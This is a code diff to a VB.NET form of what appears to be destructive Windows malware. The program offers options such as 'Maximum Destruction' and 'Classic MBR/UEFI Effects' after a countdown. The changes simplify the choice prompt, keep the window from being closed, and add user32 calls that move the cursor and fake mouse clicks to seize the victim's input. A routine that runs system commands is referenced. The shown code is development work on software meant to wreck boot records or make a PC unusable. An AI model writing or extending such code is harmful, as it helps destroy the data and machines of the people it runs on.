@@ -618,29 +618,6 @@ Public Class Form2
         End If
     End Sub
 
-    ' Function to prompt user for a choice using a MessageBox
-    Public Function PromptUserForChoice(message As String, options As String()) As String
-        Dim choice As String = String.Empty
-
-        ' Keep prompting the user until a valid choice is made
-        Do
-            choice = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", options(0))
-
-            ' Validate user choice against available options
-            For Each opt In options ' Renamed the variable from 'option' to 'opt'
-                If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
-                    Return opt ' Return the valid choice
-                End If
-            Next
-
-            ' If the choice is invalid, display an error message and prompt again
-            MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-
-        Loop While String.IsNullOrEmpty(choice) OrElse Not options.Contains(choice)
-
-        Return String.Empty ' This line will never be reached because the loop will exit on a valid choice
-    End Function
-
     ' Execute a system command
     Public Sub ExecuteCommandForm2(command As String)
         Try
@@ -736,6 +713,26 @@ Public Class Form2
         e.Cancel = True
     End Sub
 
+    ' Function to prompt user for a choice using a MessageBox
+    Public Function PromptUserForChoice(message As String, options As String()) As String
+        Dim choice As String = String.Empty
+
+        ' Prompt the user for a choice
+        choice = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", options(0))
+
+        ' Validate user choice against available options
+        For Each opt In options ' Renamed the variable from 'option' to 'opt'
+            If choice.Equals(opt, StringComparison.OrdinalIgnoreCase) Then
+                Return opt ' Return the valid choice
+            End If
+        Next
+
+        ' If the choice is invalid, display an error message
+        MessageBox.Show("Invalid choice! Please select a valid option.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+
+        Return String.Empty ' Return an empty string if no valid choice was made
+    End Function
+
     Private Sub OnCountdownComplete()
         ' When countdown finishes, prompt user for destruction option
         Dim options As String() = {
@@ -769,9 +766,8 @@ Public Class Form2
             ' Update the countdown UI (ensure it's on the UI thread)
             If timerLabel.InvokeRequired Then
                 timerLabel.Invoke(New MethodInvoker(Sub()
-                                                        ' Simulate a click on Form2 by bringing it to the front and activating it
-                                                        BringToFront() ' Bring Form2 to the front
-                                                        Activate() ' Activate Form2 to simulate a click
+                                                        ' Simulate mouse click on Form2 at a specific location (e.g., (100, 100))
+                                                        SimulateMouseClick(100, 100)
                                                         timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
                                                     End Sub))
             Else
@@ -782,8 +778,34 @@ Public Class Form2
         Else
             ' Remove the form from being topmost before completing the countdown
             TopMost = False ' Remove from topmost
+
             ' Stop the timer when the countdown reaches zero and handle completion
             OnCountdownComplete()
         End If
     End Sub
+
+    ' Function to simulate a mouse click at specific coordinates
+    Private Sub SimulateMouseClick(x As Integer, y As Integer)
+        ' Move the cursor to the target position on Form2 (in screen coordinates)
+        SetCursorPos(x, y)
+
+        ' Simulate mouse click (left mouse button down, then up)
+        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
+        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
+    End Sub
+
+    ' Import SetCursorPos from user32.dll to move the cursor to specific coordinates
+    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
+    Private Shared Function SetCursorPos(x As Integer, y As Integer) As Boolean
+    End Function
+
+    ' Import mouse_event from user32.dll to simulate mouse clicks
+    <DllImport("user32.dll", SetLastError:=True)>
+    Private Shared Sub mouse_event(dwFlags As UInteger, dx As UInteger, dy As UInteger, dwData As UInteger, dwExtraInfo As UInteger)
+    End Sub
+
+    ' Constants for mouse events
+    Private Const MOUSEEVENTF_LEFTDOWN As UInteger = &H2
+    Private Const MOUSEEVENTF_LEFTUP As UInteger = &H4
+
 End Class
